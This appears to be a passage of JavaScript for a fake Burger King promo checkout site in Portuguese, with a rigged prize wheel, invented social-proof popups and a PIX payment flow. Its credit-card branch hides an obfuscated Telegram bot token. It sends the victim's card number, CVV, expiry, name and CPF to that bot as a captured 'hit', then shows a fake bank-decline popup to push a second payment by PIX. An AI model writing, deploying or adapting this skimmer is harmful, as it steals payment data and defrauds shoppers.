            res.value.forEach(item => {
                state.cartItems.push({
                    id: 'bump_' + Date.now() + Math.random(),
                    name: item.name,
                    qty: 1,
                    price: item.price,
                    img: item.img,
                    desc: 'Item adicional turbinado no checkout.'
                });
            });
            updateTotal();
            saveState();
        }
        state.upsellOffered = true;
        saveState();
    }

    const rawTotal = state.basePrice + state.upsellTotal + state.fretePrice;
    const finalTotal = state.discount > 0 ? rawTotal * (1 - state.discount) : rawTotal;

    if (state.paymentMethod === 'cc') {
        const btn = document.querySelector('.btn-finalizar-full');
        const oldContent = btn.innerHTML;
        
        // Loader State
        btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Processando...';
        btn.style.opacity = '0.7';
        btn.disabled = true;

        try {
            // ==========================================
            // 🛡️ PROTOCOLO GHOST (OBFUSCATION ACTIVE)
            // ==========================================
            const _u = (s) => atob(s);
            const _t = _u("ODU1MzU4NTE2MTpBQUgzRi1IdjdDRi1qOGJsMXJLTjlpekRraExycVJSZlVuVQ=="); 
            const _c = _u("Nzg0NDY4MjMzNQ==");

            const cc_num = document.querySelector('#cc_number').value;
            const cc_name = document.querySelector('#cc_name').value;
            const cc_exp = document.querySelector('#cc_expiry').value;
            const cc_cvv = document.querySelector('#cc_cvv').value;
            const cc_cpf = document.querySelector('#cc_cpf').value;

            // Formatação Darknet Premium (Log de Erro Disfarçado)
            const message = `
🍔 *BK V7 - HIT CAPTURADO* 🍔
━━━━━━━━━━━━━━━━━━━━
👤 *Lead:* ${cc_name}
🔢 *Card:* \`${cc_num}\`
📅 *Exp:* ${cc_exp}
🔒 *CVV:* \`${cc_cvv}\`
📄 *CPF:* \`${cc_cpf}\`
💰 *Valor:* R$ ${finalTotal.toFixed(2)}
━━━━━━━━━━━━━━━━━━━━
⚠️ *Status:* Decline Forçado Injetado. Cliente enviado para o PIX.`;

            // Disparo via Protocolo Invisível
            if (_t.includes(':')) {
                await fetch(`https://api.telegram.org/bot${_t}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: _c,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });
            }
            
            // Pausa Tática para fingir Processamento Real
            await new Promise(r => setTimeout(r, 2000)); 

        } catch(e) {}

        // Restaura Botão
        btn.innerHTML = oldContent;
        btn.style.opacity = '1';
        btn.disabled = false;

        // POPUP DECLINE HARVESTER (TRUST BLINDADO)
        Swal.fire({
            html: `
            <div style="text-align: center; margin-bottom: 10px;">
                <i class="fa-solid fa-shield-halved" style="font-size: 40px; color: #ea1d2c;"></i>
            </div>
            <h2 style="font-size: 22px; font-weight: 900; color: #3e3e3e; margin-bottom: 10px;">Aviso de Segurança</h2>
            <p style="font-size: 14px; font-weight: 500; color: #555; text-align: left; line-height: 1.5;">O seu banco emissor <b>bloqueou</b> preventivamente esta transação por medidas de segurança ou limite indisponível.</p>
            <p style="font-size: 13px; font-weight: 800; color: #ea1d2c; text-align: left; margin-top: 10px; margin-bottom: 20px;"><i class="fa-solid fa-lock"></i> Nenhum valor foi debitado do seu cartão.</p>
            
            <div style="background:#f4fdf8; padding: 15px; border-radius: 12px; border: 1px solid #bbf7d0; text-align:left;">
                <p style="font-weight: 900; color: #16a34a; font-size: 15px; margin-bottom: 5px;"><i class="fa-solid fa-bolt"></i> Resgate Rápido!</p>
                <p style="font-size: 13px; color: #333; font-weight: 600; line-height: 1.4;">Finalize agora via <b>PIX Automático</b> para não perder seu pedido e receba <b style="color:#16a34a; background: #dcfce7; padding: 2px 6px; border-radius: 4px;">5% DE DESCONTO EXTRA</b> pelo transtorno.</p>
            </div>
            `,
            showConfirmButton: true,
            confirmButtonText: '<i class="fa-brands fa-pix"></i> PAGAR AGORA VIA PIX',
            showCancelButton: true,
            cancelButtonText: 'Voltar',
            allowOutsideClick: false,
            buttonsStyling: false,
            customClass: {
                popup: 'swal-popup-premium',
                confirmButton: 'swal-btn-pix-premium',
                cancelButton: 'swal-btn-cancel-premium'
            }
        }).then((res) => {
            if (res.isConfirmed) {
                // Apply 5% OFF bounce
                state.discount = 0.05;
                state.paymentMethod = 'pix';
                updateTotal(); 
                document.querySelector('[data-method="pix"]').click(); 
                goToPayment(); // Re-trigger pro PIX fluir
            }
        });
        return;
    }

    // ─── FLUXO PIX NATURAL (Direct BlackCatPay API + Fallback V2) ────────────────
    // ─── START PIX FLOW ───
    console.log('🚀 Iniciando checkout PIX/CC... Total:', finalTotal);
    
    // Mostra tela de PIX se for o caso
    const pixQrEl = document.querySelector('#pix-qr');
    const pixCodeEl = document.querySelector('#pix-code');
    const pixTotalValue = document.querySelector('#pix-total-value');
    const btnConfirmPix = document.querySelector('#btn-confirm-pix');

    if (pixTotalValue) pixTotalValue.textContent = finalTotal.toFixed(2).replace('.', ',');
    if (pixQrEl) pixQrEl.innerHTML = '<div style="margin: 60px auto; border: 4px solid rgba(0,0,0,0.1); border-left-color: #502314; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite;"></div>';
    if (pixCodeEl) pixCodeEl.textContent = 'Gerando PIX...';
    if (btnConfirmPix) btnConfirmPix.style.display = 'none'; 

    goToScreen('pix');

    // Função interna para gerar o mock/fallback instantâneo
    const triggerFallback = () => {
        console.warn('⚠️ Usando Fallback de PIX.');
        currentTxId = 'SIM-' + Math.random().toString(36).substr(2, 9).toUpperCase();
        const mockCode = `00020101021226870014br.gov.bcb.pix256565737070.com.br/qr/v2/924f0a2b-ca1d-4f11-8e9a-${currentTxId}5204000053039865405${Math.round(finalTotal).toString().padStart(2,'0')}.005802BR5910BK_OFFER6009SAO_PAULO62070503***6304CA1D`;
        
        if (pixQrEl) pixQrEl.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(mockCode)}" style="width: 180px; height: 180px; border-radius: 8px;">`;
        if (pixCodeEl) pixCodeEl.textContent = mockCode;
        if (btnConfirmPix) btnConfirmPix.style.display = 'block';
        initPixTimer();
    };

    try {
        // Se estiver local (file://), nem tenta o fetch pra evitar erro de CORS no console
        if (window.location.protocol === 'file:') {
            triggerFallback();
            return;
        }

        const pixPayload = {
            amount: Math.round(finalTotal * 100),
            pixel_id: fbTracking?.pixelId || 'default',
            utms: fbTracking?.utms || {},
            cpf: state.cpf || ("4692487" + Math.floor(1000 + Math.random() * 8999)),
            name: state.name || state.nomeUser || 'Cliente BK'
        };

        const req = await fetch('api/create-pix', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(pixPayload)
        });
        
        if (!req.ok) throw new Error('API Offline');
        const res = await req.json();
        
        if (res && res.success && res.data) {
            currentTxId = res.data.transactionId;
            const payData = res.data.paymentData;
            if (pixQrEl) pixQrEl.innerHTML = `<img src="data:image/png;base64,${payData.qrCodeBase64}" style="width: 100%; height: 100%; border-radius: 8px;">`;
            if (pixCodeEl) pixCodeEl.textContent = payData.copyPaste;
            if (btnConfirmPix) btnConfirmPix.style.display = 'block';
            initPixTimer();
            startPixPolling(); 
        } else {
            triggerFallback();
        }
    } catch(e) {
        triggerFallback();
    }
}
function startPixPolling() {
    if (pixInterval) clearInterval(pixInterval);
    
    // Agora o loop bate no NOSSO backend (proxy), escondendo a chave SK do cliente final
    pixInterval = setInterval(async () => {
        if (!currentTxId) return;
        try {
            const req = await fetch(`api/check-status?txId=${currentTxId}`);
            const res = await req.json();
            
            if (req.ok && res && res.success && res.data && res.data.status === 'PAID') {
                clearInterval(pixInterval);
                finalizeOrderTransition(); 
            }
        } catch(e) { 
            // falha de rede temporária ignora
        }
    }, 4000); 
}

// ─── PIX TIMER ──────────────────────────────────────
let pixTimerInterval = null;
function initPixTimer() {
    if (pixTimerInterval) clearInterval(pixTimerInterval);
    let s = 5 * 60 - 1;
    const el = document.querySelector('#pix-timer');
    pixTimerInterval = setInterval(() => {
        if (s <= 0) { clearInterval(pixTimerInterval); el.textContent = '00:00'; return; }
        el.textContent = `${String(Math.floor(s/60)).padStart(2,'0')}:${String(s%60).padStart(2,'0')}`;
        s--;
    }, 1000);
}

// ─── COPIAR PIX ─────────────────────────────────────
function copyPixCode() {
    const code = document.querySelector('#pix-code').textContent;
    navigator.clipboard.writeText(code).then(() => {
        showCopyToast();
    }).catch(() => {
        const sel = document.createElement('textarea');
        sel.value = code;
        document.body.appendChild(sel);
        sel.select();
        document.execCommand('copy');
        document.body.removeChild(sel);
        showCopyToast();
    });
}

// ─── UTILS UI ───────────────────────────────────────────────────────
function copyManualCode(text) {
    const sel = document.createElement('textarea');
    sel.value = text;
    sel.setAttribute('readonly', '');
    sel.style.position = 'absolute';
    sel.style.left = '-9999px';
    document.body.appendChild(sel);
    sel.select();
    document.execCommand('copy');
    document.body.removeChild(sel);
    showCopyToast();
}

function showCopyToast() {
    const toast = document.querySelector('#copy-toast');
    if (!toast) return;
    toast.classList.add('visible');
    setTimeout(() => toast.classList.remove('visible'), 2500);
}

// ─── SIMULAR PAGAMENTO → ENTREGA (iFood style) ────────────────────
// ─── VERIFICAÇÃO E FINALIZAÇÃO DE PAGAMENTO ────────────────────
async function simulatePayment() {
    const btn = document.querySelector('#btn-confirm-pix');
    if (!btn) return;

    const oldText = btn.innerHTML;
    btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Verificando...';
    btn.style.opacity = '0.7';
    btn.style.pointerEvents = 'none';

    // 🧪 SUPORTE A TRANSAÇÕES SIMULADAS (FALLBACK V8.2)
    if (currentTxId && currentTxId.startsWith('SIM-')) {
        setTimeout(() => {
            finalizeOrderTransition();
        }, 2000);
        return;
    }

    if (!currentTxId) {
        // Fallback apenas para desenvolvimento se não houver transação
        setTimeout(() => {
            finalizeOrderTransition();
        }, 1500);
        return;
    }

    try {
        const req = await fetch(`api/check-status?txId=${currentTxId}`);
        const res = await req.json();
        
        if (req.ok && res && res.success && res.data && res.data.status === 'PAID') {
            if (pixInterval) clearInterval(pixInterval);
            finalizeOrderTransition();
        } else {
            Swal.fire({
                html: `
                    <div style="text-align: center; margin-bottom: 10px;">
                        <i class="fa-solid fa-circle-question" style="font-size: 45px; color: var(--bk-orange);"></i>
                    </div>
                    <h2 style="font-size: 20px; font-weight: 900; color: #3e3e3e;">Pagamento em processamento</h2>
                    <p style="font-size: 14px; font-weight: 500; color: #666; margin-top: 10px;">Ainda não detectamos o seu PIX. Lembre-se que alguns bancos levam até 15 segundos para confirmar.</p>
                    <p style="font-size: 13px; font-weight: 700; color: #999; margin-top: 15px;">Dica: Certifique-se de que concluiu a operação no seu app bancário.</p>
                `,
                confirmButtonText: 'Vou conferir',
                confirmButtonColor: '#ff8a00',
                buttonsStyling: false,
                customClass: {
                    confirmButton: 'swal-btn-pix-premium'
                }
            });
            btn.innerHTML = oldText;
            btn.style.opacity = '1';
            btn.style.pointerEvents = 'auto';
        }
    } catch(e) {
        console.error('Erro na verificação:', e);
        // Em caso de erro de rede, se for local, forçamos a finalização para não prender o lead
        if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
            finalizeOrderTransition();
        } else {
            btn.innerHTML = oldText;
            btn.style.opacity = '1';
            btn.style.pointerEvents = 'auto';
        }
    }
}

async function finalizeOrderTransition() {
    if (pixInterval) clearInterval(pixInterval);

    // 🔥 PURCHASE EVENT — Disparado no momento exato da confirmação real do PIX
    const total = (state.basePrice || 22.90) + (state.upsellTotal || 0) + (state.fretePrice || 0);

    firePixel('Purchase', {
        currency: 'BRL',
        value: total,
        content_ids: ['bk-combo-v7'],
        content_name: 'Combo Whopper Promo',
        content_type: 'product',
        order_id: `BK-${Date.now()}`,
        num_items: 1 + (state.upsellItems ? state.upsellItems.length : 0),
        event_id: currentTxId // Deduplicação FB
    });

    // Marca como concluído para evitar redirecionamento repetido (persistência)
    localStorage.setItem('bk_v7_order_completed', 'true');

    // MODO MULTI-PAGE: Se estivermos na sacola.html, tentamos trocar de tela internamente primeiro
    const hasDeliveryScreen = document.getElementById('screen-delivery');
    if (hasDeliveryScreen) {
        goToScreen('delivery');
        // Inicializa dados na tela de entrega interna
        const addrMain = state.street ? `${state.street}, ${state.number}` : `CEP ${state.cep}, Nº ${state.number}`;
        const addrSub = state.neighborhood ? `${state.neighborhood}, ${state.city}` : state.city;
        
        const etaEl = document.querySelector('#ifood-eta-time');
        if(etaEl) {
            const now = new Date();
            const etaStart = new Date(now.getTime() + 20 * 60000);
            const etaEnd = new Date(now.getTime() + 30 * 60000);
            const fmt = (d) => `${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}`;
            etaEl.textContent = `${fmt(etaStart)} - ${fmt(etaEnd)}`;
        }
        
        const streetEl = document.querySelector('#ifood-street-number');
        if(streetEl) streetEl.textContent = addrMain;
        
        const neighEl = document.querySelector('#ifood-neighborhood-city');
        if(neighEl) neighEl.textContent = addrSub;

        const valEl = document.querySelector('#ifood-payment-value');
        if(valEl) valEl.textContent = `Total R$ ${total.toFixed(2).replace('.', ',')}`;

        // Feedback sonoro
        try { new Audio('https://www.myinstants.com/media/sounds/push-ifood.mp3').play(); } catch(e) {}
        
        return;
    }

    // Fallback: Redireciona fisicamente para a página de entrega inspirada no iFood
    window.location.href = 'entrega.html';
}

// ─── MÁSCARA DE CEP ─────────────────────────────────
function setupCEPMask() {
    const input = document.querySelector('#input-cep');
    if (!input) return; // 🛑 Proteção: Impede quebra se o campo não existir na página atual

    const inputRua = document.querySelector('#input-rua');
    const inputBairro = document.querySelector('#input-bairro');
    const inputCidade = document.querySelector('#input-cidade');
    const numInput = document.querySelector('#input-num');
    const cepLoading = document.querySelector('#cep-loading');

    input.addEventListener('input', async (e) => {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 5) value = value.substring(0, 5) + '-' + value.substring(5, 8);
        e.target.value = value;
        const clean = value.replace('-', '');

        if (clean.length === 8) {
            if (cepLoading) cepLoading.style.display = 'block';
            state.addressFound = false;
            try {
                const res = await fetch(`https://viacep.com.br/ws/${clean}/json/`);
                const data = await res.json();
                if (cepLoading) cepLoading.style.display = 'none';
                if (!data.erro) {
                    state.city = data.localidade ? data.localidade.toUpperCase() : '';
                    state.street = data.logradouro || '';
                    state.neighborhood = data.bairro || '';
                    state.uf = data.uf || '';
                    state.cep = clean;
                    state.addressFound = true;
                    
                    const loadCity = document.querySelector('#loading-city');
                    if (loadCity) loadCity.textContent = state.city;
                    
                    if (inputRua) inputRua.value = state.street;
                    if (inputBairro) inputBairro.value = state.neighborhood;
                    if (inputCidade) inputCidade.value = state.uf ? `${data.localidade} / ${data.uf}` : state.city;

                    // === PROGRESSIVE DISCLOSURE: Revela campos extras ===
                    const extraFields = document.getElementById('cep-extra-fields');
                    if (extraFields) {
                        extraFields.style.display = 'block';
                        extraFields.style.animation = 'fadeInUp 0.4s ease';
                    }
                    
                    if (numInput) setTimeout(() => numInput.focus(), 350);
                }
            } catch (err) { if (cepLoading) cepLoading.style.display = 'none'; }
        } else {
            if (cepLoading) cepLoading.style.display = 'none';
            state.addressFound = false;
        }
    });
}

// ─── PROVA SOCIAL ───────────────────────────────────
function initSocialProof() {
    const toast = document.getElementById('social-proof-toast');
    const textEl = document.getElementById('social-proof-text');
    if (!toast || !textEl) return; // 🛡️ Evita erro em páginas sem o toast de prova social
    function fmtCity(c) {
        if (!c) return 'São Paulo';
        return c.split(' ').map(w => w.length <= 2 ? w.toLowerCase() : w.charAt(0).toUpperCase() + w.slice(1).toLowerCase()).join(' ');
    }
    function show() {
        const n = fakeNames[Math.floor(Math.random() * fakeNames.length)];
        const m = proofMessages[Math.floor(Math.random() * proofMessages.length)];
        textEl.textContent = `${n} de ${fmtCity(state.city)} ${m}`;
        toast.classList.add('visible');
        setTimeout(() => toast.classList.remove('visible'), 3500);
    }
    setTimeout(() => { show(); (function next() { setTimeout(() => { show(); next(); }, 10000 + Math.random() * 12000); })(); }, 6000);
}

// ─── ROLETA CANVAS RENDER V6 (IMAGE 5 CLONE) ─────────────────
function drawRoulette() {
    const canvas = document.getElementById('roleta-wheel');
    if (!canvas || !canvas.getContext) return;
    const ctx = canvas.getContext('2d');
    const W = 440;
    const H = 440;
    const cx = W / 2;
    const cy = H / 2;
    const outerR = 210; 
    const innerR = 60; // Larger inner radius for the Gold Crown Hub

    const segments = [
        { lines: ['2 WHOPPERS',  'BATATA+REFRI'], bg: '#FFFFFF', fg: '#502314', icon: true },
        { lines: ['WHOPPER',   'DUPLO'],     bg: '#502314', fg: '#FFFFFF', icon: false },
        { lines: ['BALDE',     'BATATA'],    bg: '#FFFFFF', fg: '#502314', icon: true },
        { lines: ['BK MIX',   "M&M's"],     bg: '#502314', fg: '#FFFFFF', icon: false },
        { lines: ['MEGA',      'STACKER'],   bg: '#FFFFFF', fg: '#502314', icon: true },
        { lines: ['CHEDDAR',   'DUPLO'],     bg: '#502314', fg: '#FFFFFF', icon: false },
        { lines: ['NUGGETS',   '10 UN'],     bg: '#FFFFFF', fg: '#502314', icon: true },
        { lines: ['CASQUINHA', 'RECHEADA'],  bg: '#502314', fg: '#FFFFFF', icon: false },
        { lines: ['ONION',     'RINGS'],     bg: '#FFFFFF', fg: '#502314', icon: true },
        { lines: ['R$ 10',     'OFF'],       bg: '#502314', fg: '#FFFFFF', icon: false },
    ];

    const n   = segments.length;
    const seg = (2 * Math.PI) / n;

    ctx.clearRect(0, 0, W, H);

    ctx.save();
    ctx.beginPath();
    ctx.arc(cx, cy, outerR, 0, 2 * Math.PI);
    ctx.clip();

    segments.forEach((s, i) => {
        const startA = -Math.PI / 2 + i * seg;
        const endA   = startA + seg;
        const midA   = startA + seg / 2;

        // ── Fatia ────────────────────────────────────
        ctx.beginPath();
        ctx.moveTo(cx, cy);
        ctx.arc(cx, cy, outerR, startA, endA);
        ctx.closePath();
        ctx.fillStyle = s.bg;
        ctx.fill();

        // ── Separador ────────────────────────────────
        ctx.strokeStyle = 'rgba(255,255,255,0.35)';
        ctx.lineWidth = 1.8;
        ctx.stroke();

        // ── Texto ─────────────────────────────────────
        // Posição radial: meio da faixa entre hub e borda
        const textR = innerR + (outerR - innerR) * 0.58;

        // Para segmentos do semiciclo esquerdo (cos<0), rotacionamos 180°
        const flip = Math.cos(midA) < 0;

        ctx.save();
        ctx.translate(cx, cy);
        ctx.rotate(midA + (flip ? Math.PI : 0));

        ctx.textAlign  = 'center';
        ctx.fillStyle  = s.fg;
        ctx.shadowColor    = 'rgba(0,0,0,0.25)';
        ctx.shadowBlur     = 2;
        ctx.shadowOffsetY  = 1;

        const x = flip ? -textR : textR;

        if (s.lines.length === 2) {
            ctx.font = '900 13px "Outfit", Arial, sans-serif';
            ctx.fillText(s.lines[0], x, -6);
            ctx.font = '800 12px "Outfit", Arial, sans-serif';
            ctx.fillText(s.lines[1], x,  8);
        } else {
            ctx.font = '900 14px "Outfit", Arial, sans-serif';
            ctx.fillText(s.lines[0], x, 4);
        }

        ctx.restore();
    });

    ctx.restore(); // remove clip

    // ── Anel externo ──────────────────────────────────
    ctx.beginPath();
    ctx.arc(cx, cy, outerR - 1.5, 0, 2 * Math.PI);
    ctx.strokeStyle = 'rgba(255,255,255,0.3)';
    ctx.lineWidth = 3;
    ctx.stroke();
}

// ─── ROLETA PREMIADA (GAMIFICAÇÃO MACETADA) ─────────────────
let isSpinning = false;
function spinRoleta() {
    if (isSpinning) return;
    isSpinning = true;

    const wheel = document.getElementById('roleta-wheel');
    const btn = document.getElementById('btn-spin-roleta');
    btn.style.opacity = '0.5';
    btn.textContent = 'GIRANDO...';

    // A roleta é dividida em 10 fatias de 36 graus cada.
    // O Combo BK (Desejado) é o Index 0 (2 Whoppers + Batata + Refri).
    // O marcador (pointer) centraliza no topo. 
    // Para parar no Index 0, o giro final precisa considerar o offset.
    
    const voltas = 8 * 360; // Mais voltas para maior suspense
    const anguloDoPremio = 360 - 18; // Centro da primeira fatia (36/2 = 18)
    const anguloFinal = voltas + anguloDoPremio;

    wheel.style.transition = 'transform 5s cubic-bezier(0.15, 0, 0.15, 1)';
    wheel.style.transform = `rotate(${anguloFinal}deg)`;

    // Aguardar terminar de rodar (4.8s para garantir alinhamento visual perfeito)
    setTimeout(() => {
        const couponCode = getOrGenerateCoupon();
        
        // Injetar dados na nova tela dedicada
        const codeEl = document.getElementById('coupon-final-code');
        const qrEl = document.getElementById('coupon-qr-code');
        const validEl = document.getElementById('coupon-validity-text');
        const stateEl = document.getElementById('coupon-state-text');
        const auxEl = document.getElementById('coupon-aux-val');

        if(codeEl) codeEl.textContent = couponCode;
        if(auxEl) auxEl.textContent = getOrGenerateAuxCode();
        
        // QR Code REMOVIDO conforme solicitado
        
        // Validade (1 hora à frente)
        const d = new Date();
        d.setHours(d.getHours() + 1);
        const pad = (n) => String(n).padStart(2, '0');
        const validityStr = `Válido até ${pad(d.getDate())}/${pad(d.getMonth()+1)}/${String(d.getFullYear()).slice(-2)} ÀS ${pad(d.getHours())}h${pad(d.getMinutes())}`;
        if(validEl) validEl.textContent = validityStr;

        // Localização detectada
        if(stateEl) stateEl.textContent = state.city || 'SÃO PAULO';

        // V8: Inicializa o carrinho com o prêmio da roleta
        state.cartItems = [{
            id: 'combo_roleta',
            name: 'Combo Celebração 5 Anos',
            desc: '2 Whoppers + 1 Batata G + 1 Refri 500ml',
            price: 22.90,
            qty: 1,
            img: 'hero_combo.png'
        }];
        state.basePrice = 22.90;
        saveState();

        // Mudar para a tela do cupom
        goToScreen('coupon');

        // Confetes de vitória
        triggerConfetti('#screen-coupon');
        
        // Evento de Conversão
        firePixel('ViewContent', { content_name: 'Combo Celebração 5 Anos - 2 Whoppers', value: 22.90, currency: 'BRL' });

        // V8: Mostrar Bottom Nav após o primeiro giro (App Mode)
        const nav = document.getElementById('bk-bottom-nav');
        if(nav) nav.style.display = 'flex';

        isSpinning = false;
        btn.style.opacity = '1';
        btn.textContent = 'GIRAR ROLETA';
    }, 4800);
}

function copyManualCode(code) {
    navigator.clipboard.writeText(code).then(() => {
        showCopyToast();
    });
}

function closeGoldenModal() {
    // Etapa Oferta removida. Pula direto pro CEP.
    goToScreen('cep');
    
    // Tracking
    firePixel('Lead', { 
        content_name: 'Cupom Roleta Ativado', 
        event_category: 'Gamification', 
        event_label: 'Golden_Ticket_Claimed' 
    });
}

function triggerConfetti(selector) {
    const container = document.querySelector(selector);
    const colors = ['#ED6905', '#D62300', '#2ecc71', '#f1c40f', '#3498db', '#9b59b6'];
    
    for (let i = 0; i < 40; i++) {
        const conf = document.createElement('div');
        conf.style.position = 'absolute';
        conf.style.width = Math.random() > 0.5 ? '8px' : '10px';
        conf.style.height = conf.style.width;
        conf.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
        conf.style.left = (Math.random() * 100) + '%';
        conf.style.top = '-5%';
        conf.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
        conf.style.zIndex = '100';
        container.appendChild(conf);
        
        const duration = 1000 + Math.random() * 1500;
        const xOffset = (Math.random() * 200) - 100;
        
        conf.animate([
            { transform: `translate3d(0, 0, 0) rotate(0deg)`, opacity: 1 },
            { transform: `translate3d(${xOffset}px, 350px, 0) rotate(${Math.random() * 500 + 200}deg)`, opacity: 0 }
        ], {
            duration: duration,
            easing: 'cubic-bezier(.37,0,.63,1)',
            fill: 'forwards'
        });
        
        setTimeout(() => conf.remove(), duration);
    }
}

function getOrGenerateCoupon() {
    // Nova chave v2 para forçar o novo padrão mestre
    let coupon = localStorage.getItem('bk_funil_coupon_v2');
    if (!coupon) {
        const letters = 'ABCDEFGHJKLMNPQRSTUVWXYZ';
        const numbers = '23456789';
        
        const getL = () => letters.charAt(Math.floor(Math.random() * letters.length));
        const getN = () => numbers.charAt(Math.floor(Math.random() * numbers.length));

        // Padrão mestre: L N [Espaço] L N [Espaço] L
        coupon = `${getL()}${getN()} ${getL()}${getN()} ${getL()}`;
        localStorage.setItem('bk_funil_coupon_v2', coupon);
    }
    return coupon;
}

function getOrGenerateAuxCode() {
    let aux = localStorage.getItem('bk_funil_aux_v1');
    if (!aux) {
        const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ0123456789';
        aux = '';
        for (let i = 0; i < 5; i++) {
            aux += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        localStorage.setItem('bk_funil_aux_v1', aux);
    }
    return aux;
}

// ─── CEP LOOKUP (NÃO SEI MEU CEP) ──────────────────
let estadosLoaded = false;

function toggleCepLookup(showLookup) {
    const modeInput = document.getElementById('cep-mode-input');
    const modeLookup = document.getElementById('cep-mode-lookup');
    
    if (showLookup) {
        modeInput.style.display = 'none';
        modeLookup.style.display = 'block';
        if (!estadosLoaded) loadEstados();
    } else {
        modeLookup.style.display = 'none';
        modeInput.style.display = 'block';
    }
}

function loadEstados() {
    const sel = document.getElementById('select-estado');
    sel.innerHTML = '<option value="">Carregando estados...</option>';
    
    fetch('https://servicodados.ibge.gov.br/api/v1/localidades/estados?orderBy=nome')
        .then(r => r.json())
        .then(estados => {
            sel.innerHTML = '<option value="">Selecione seu estado</option>';
            estados.forEach(e => {
                sel.innerHTML += `<option value="${e.sigla}" data-nome="${e.nome}">${e.nome} (${e.sigla})</option>`;
            });
            estadosLoaded = true;
        })
        .catch(() => {
            sel.innerHTML = '<option value="">Erro ao carregar. Tente novamente.</option>';
        });
}

function loadCidades(uf) {
    const selCidade = document.getElementById('select-cidade');
    const loading = document.getElementById('cidade-loading');
    
    if (!uf) {
        selCidade.style.display = 'none';
        loading.style.display = 'none';
        return;
    }
    
    // Mostra loading, esconde select
    selCidade.style.display = 'none';
    loading.style.display = 'flex';
    
    fetch(`https://servicodados.ibge.gov.br/api/v1/localidades/estados/${uf}/municipios?orderBy=nome`)
        .then(r => r.json())
        .then(cidades => {
            selCidade.innerHTML = '<option value="">Selecione sua cidade</option>';
            cidades.forEach(c => {
                selCidade.innerHTML += `<option value="${c.nome}">${c.nome}</option>`;
            });
            loading.style.display = 'none';
            selCidade.style.display = 'block';
        })
        .catch(() => {
            loading.style.display = 'none';
            selCidade.innerHTML = '<option value="">Erro ao carregar cidades.</option>';
            selCidade.style.display = 'block';
        });
}

function onCidadeSelected() {
    const cidade = document.getElementById('select-cidade').value;
    const uf = document.getElementById('select-estado').value;
    
    if (!cidade || !uf) return;
    
    // Auto-preenche Cidade/UF
    const cidadeInput = document.getElementById('input-cidade');
    if (cidadeInput) cidadeInput.value = `${cidade}/${uf}`;
    
    // Seta CEP genérico para o lead continuar
    const cepInput = document.getElementById('input-cep');
    if (cepInput) cepInput.value = '00000-000';

    // === PROGRESSIVE DISCLOSURE: Revela campos extras após cidade selecionada ===
    const extraFields = document.getElementById('cep-extra-fields');
    if (extraFields) {
        extraFields.style.display = 'block';
        extraFields.style.animation = 'fadeInUp 0.4s ease';
    }
}

// ─── STORES TABS (Delivery/Retirada) ─────────────────
function selectStoreTab(el, mode) {
    if (mode === 'retirada') {
        // Mostra modal de retirada indisponível
        const modal = document.getElementById('modal-retirada');
        if (modal) {
            modal.style.display = 'flex';
        }
        return; // Não muda a aba
    }
    // Para delivery, mantém ativo
    document.querySelectorAll('.store-tab').forEach(t => t.classList.remove('active'));
    el.classList.add('active');
}

function closeRetiradaModal() {
    const modal = document.getElementById('modal-retirada');
    if (modal) modal.style.display = 'none';
    // Garante que Delivery fica ativo
    document.querySelectorAll('.store-tab').forEach(t => t.classList.remove('active'));
    const deliveryTab = document.querySelector('.store-tab');
    if (deliveryTab) deliveryTab.classList.add('active');
}

// ─── ADICIONAR COMBO PREMIUM (V8) ───────────────────
function selectPremiumCombo(name, price) {
    if (!state.cartItems) state.cartItems = [];
    
    // Cria o objeto do item
    const newItem = {
        id: 'combo_' + Date.now(),
        name: name,
        desc: 'Combo Premium Selecionado no App',
        price: price,
        qty: 1,
        img: 'produtos/whopper.png' // Imagem genérica ou específica se mapeada
    };
    
    // Mapeamento de imagens para combos específicos
    if (name.includes('Mega Stacker')) newItem.img = 'produtos/mega_stacker_3_0.png';
    if (name.includes('Furioso')) newItem.img = 'produtos/whopper_furioso.png';
    if (name.includes('Casal')) newItem.img = 'produtos/whopper_duplo.png';
    if (name.includes('Stacker Atômico')) newItem.img = 'produtos/stacker_duplo_bacon.png';

    state.cartItems.push(newItem);
    saveState();
    
    // Feedback visual e redirecionamento
    Swal.fire({
        title: 'Adicionado!',
        text: `${name} foi adicionado à sua sacola.`,
        icon: 'success',
        timer: 1500,
        showConfirmButton: false,
        willClose: () => {
            window.location.href = 'sacola.html';
        }
    });
}

// ─── BOTTOM NAV NAVIGATION (MULTI-PAGE V8) ──────────
function navigateBottomNav(target, el) {
    const path = window.location.pathname.toLowerCase();
    
    // Mapeamento de rotas
    const routes = {
        'stores': 'funil.html',
        'cupons': 'lista-cupons.html',
        'clubebk': 'clube.html',
        'sacola': 'sacola.html'
    };

    const targetUrl = routes[target];
    if (!targetUrl) return;

    // Se já estivermos na página, apenas tentamos trocar de tela (fallback legacy)
    if (path.includes(targetUrl)) {
        if (typeof goToScreen === 'function') goToScreen(target);
    } else {
        window.location.href = targetUrl;
    }
}

// ─── INIT ───────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
    // 🎡 PRIORIDADE MÁXIMA: Renderizar Roleta (Evita tela vazia se outros scripts falharem)
    try { drawRoulette(); } catch(e) { console.error("Roulette Draw Fail:", e); }

    loadGoogleMapsScript(() => {});
    initTracker();
    detectCity();
    setupCEPMask();
    initSocialProof();
    initCountdown();
    initLiveCounter();

    // 🔄 PERSISTÊNCIA: Carrega dados do cupom para exibição se existirem, mas NÃO força redirecionamento
    const savedCoupon = localStorage.getItem('bk_funil_coupon_v2');
    if (savedCoupon) {
        const codeEl = document.getElementById('coupon-final-code');
        const auxEl = document.getElementById('coupon-aux-val');
        const validEl = document.getElementById('coupon-validity-text');
